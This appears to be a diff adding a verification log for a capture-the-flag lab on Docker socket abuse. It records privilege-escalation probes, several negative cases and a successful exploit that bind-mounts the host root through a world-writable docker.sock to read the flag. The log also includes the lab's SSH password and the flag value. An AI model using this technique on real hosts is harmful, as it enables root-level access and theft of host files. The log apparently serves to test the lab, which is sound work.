@@ -1,0 +1,91 @@
+[connected] 192.168.204.178:22009 as player (password Player@2026)
+
+========================================================================
+## 身份基线
+player@lx09:~$ id; groups
+uid=1001(player) gid=1001(player) groups=1001(player)
+player
+[rc=0]
+
+========================================================================
+## socket 权限
+player@lx09:~$ ls -l /var/run/docker.sock
+srw-rw-rw- 1 root root 0 Nov 19 00:10 /var/run/docker.sock
+[rc=0]
+
+========================================================================
+## API 探活（负向：只读端点）
+player@lx09:~$ curl -s --unix-socket /var/run/docker.sock http://localhost/version
+{"Version": "24.0.7", "ApiVersion": "1.43", "KernelVersion": "7.0.0-38-generic", "Os": "linux", "ID": "19c802cb2b0840f090cd9a38088d679a"}
+[rc=0]
+
+========================================================================
+## 直接读 flag（负向）
+player@lx09:~$ cat /flag.txt
+[stderr] cat: /flag.txt: Permission denied
+[rc=1]
+
+========================================================================
+## 直接读宿主视图（负向）
+player@lx09:~$ ls -ld /var/lib/dockersim; cat /var/lib/dockersim/hostroot/flag.txt
+drwx------ 1 root root 4096 Nov 19 00:10 /var/lib/dockersim
+[stderr] cat: /var/lib/dockersim/hostroot/flag.txt: Permission denied
+[rc=1]
+
+========================================================================
+## sudo（负向）
+player@lx09:~$ printf 'Player@2026\n' | sudo -S -k id 2>&1
+[sudo] password for player: player is not in the sudoers file.
+[rc=1]
+
+========================================================================
+## 其他提权面（负向）
+player@lx09:~$ find / -xdev -perm -4000 -type f 2>/dev/null; ls -l /etc/cron.d 2>/dev/null; cat /etc/passwd | grep -c player
+/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/sudo
+total 4
+-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
+1
+[rc=0]
+
+========================================================================
+## 盲跑容器（负向：没有挂载）
+player@lx09:~$ curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["cat","/host/flag.txt"],"Binds":[]}' http://localhost/containers/create --output /tmp/c0.json; CID=$(jq -r .Id /tmp/c0.json); curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/$CID/logs
+cat: /host/flag.txt: No such file or directory
+[rc=0]
+
+========================================================================
+## 挂载非根路径（负向）
+player@lx09:~$ curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["cat","/e/shadow"],"Binds":["/etc:/e"]}' http://localhost/containers/create
+{"message": "bind source '/etc' rejected: only '/' is allowed"}
+[rc=0]
+
+========================================================================
+## 要求执行 shell（负向）
+player@lx09:~$ curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["sh","-c","id"],"Binds":["/:/host"]}' http://localhost/containers/create
+{"message": "command 'sh' not permitted by this endpoint policy"}
+[rc=0]
+
+========================================================================
+## 路径穿越（负向）
+player@lx09:~$ curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["cat","/host/../../flag.txt"],"Binds":["/:/host"]}' http://localhost/containers/create --output /tmp/c1.json; CID=$(jq -r .Id /tmp/c1.json); curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/$CID/logs
+[sim] bind /var/lib/dockersim/hostroot -> /host (read-only host root view)
+cat: /host/../../flag.txt: Permission denied (outside container rootfs)
+[rc=0]
+
+========================================================================
+## 正向：挂宿主根 + 读 /host/flag.txt
+player@lx09:~$ curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["cat","/host/flag.txt"],"Binds":["/:/host"],"Privileged":true}' http://localhost/containers/create --output /tmp/c2.json; CID=$(jq -r .Id /tmp/c2.json); echo container=$CID; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/$CID/logs; curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/$CID >/dev/null
+container=d0231dbce25f
+[sim] bind /var/lib/dockersim/hostroot -> /host (read-only host root view)
+[sim] privileged requested; this endpoint is read-only, no effect
+Ly_Flag{bl6c0a21}
+[rc=0]
